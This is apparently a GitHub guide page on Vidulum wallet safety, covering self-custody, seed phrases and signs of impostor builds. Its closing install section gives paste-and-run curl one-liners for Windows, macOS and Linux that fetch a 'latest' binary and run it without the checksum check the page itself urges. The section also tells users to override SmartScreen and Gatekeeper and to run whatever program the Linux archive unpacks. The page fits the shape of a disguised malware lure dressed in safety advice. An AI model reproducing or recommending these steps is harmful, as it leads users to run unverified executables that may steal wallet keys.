![Vidulum](../assets/banner-article.png)

# Is Vidulum Wallet Safe: Custody, Keys and Impostor Signs

What the wallet protects, what only you can protect, and how fakes give themselves away.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

Only the [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) is the build to verify against.

> No wallet can protect you from a phrase typed into the wrong window. That risk is yours to close.

Vidulum is self-custody: keys are created on your machine and the recovery phrase is yours. That is the strongest and weakest property of the design at the same time. It means nobody can freeze your balance, and it means nobody can undo a mistake. This page sets out what the model protects, where the real risks sit, and how impostors give themselves away.

<!-- ARTICLE-BODY-BEGIN -->

## Where the keys live

Keys are generated locally and stored with the application. Neither the project nor any support channel holds a copy, which is why a phrase cannot be reset and why a lost phrase cannot be recovered by anyone.

The consequence is a clean split of responsibility. The software's job is to generate, store and use keys correctly. Your job is to keep the phrase offline and never enter it anywhere except the application's own restore screen, on a machine you control.

## What only you can protect

- **The phrase.** Written offline, stored in two independent places, never typed into a website or a chat.
- **The machine.** Malware that reads the screen or the clipboard defeats a well-built wallet.
- **The destination address.** A send goes where you tell it, and there is no reversal.
- **The installer.** A lookalike build can be a different program wearing the same name.

Three of those four are the reader's, not the developer's. Most "is this wallet safe" questions are really about them.

## How impostors give themselves away

| Signal | What it means |
| --- | --- |
| Setup or "verification" asks for the phrase | Not the application. Delete it. |
| A support account offers to validate your wallet | Nobody legitimate needs your phrase. |
| Download comes from a portal, APK site or file locker | Not a source; use the release page. |
| Checksum does not match the release | The file is not the published build. |
| Urgency: "act now or lose access" | Pressure is the tool, not the message. |

The common thread is a request for the phrase or a push to install something. A wallet cannot ask for what it already has.

## What the evidence does and does not show

What is documented: local key generation, self-custody, no service fee, and the network list. What is not documented in the material behind this page: a security audit, a certification, or a formal verification of the code.

Third-party reports about the project exist, and they are reports rather than findings. This page does not restate allegations as fact, and it does not claim a clean bill of health either. If a specific claim matters to your decision, ask the project directly and ask for the underlying evidence.

What one phrase rebuilds is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-20-networks-one-recovery-phrase.md">Vidulum Wallet 20 networks from one recovery phrase</a>.

## A short verification routine

1. Download from the release page and compare the checksum.
2. Run the installer and watch for a phrase prompt: there should never be one.
3. Create a fresh wallet, write the phrase down offline, and confirm it restores before funding it.
4. Fund with a small amount first, send it out, and confirm both directions.

Four steps, one afternoon, and the answer is about your setup rather than a marketing page.

For the narrower case, <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-private-key-export-one-address.md">Vidulum Wallet private key export</a> explains the rescue route.

For distribution questions, <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-apk-check-android-build-official.md">Vidulum Wallet Android APK check</a> gives the verification routine rather than a verdict.

Verify the installer against the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> before you run it.

## FAQ

### Does Vidulum hold my coins?

No. Keys are local and self-custodied. There is no account balance the project can freeze or return.

### Can Vidulum recover my phrase if I lose it?

No. Nothing on the service side can rebuild a phrase it never had.

### Is there an audit I can read?

No audit is documented in the material behind this page, so none is claimed. Ask the project for evidence if it matters.

### Are the mobile versions official?

Mobile distribution is unresolved: listings and third-party reviews exist, and this page does not certify any of them. Treat an APK from outside the release page as unverified.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[20 networks from one phrase](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-20-networks-one-recovery-phrase.md) - [Private key export](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-private-key-export-one-address.md) - [APK checks](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-apk-check-android-build-official.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
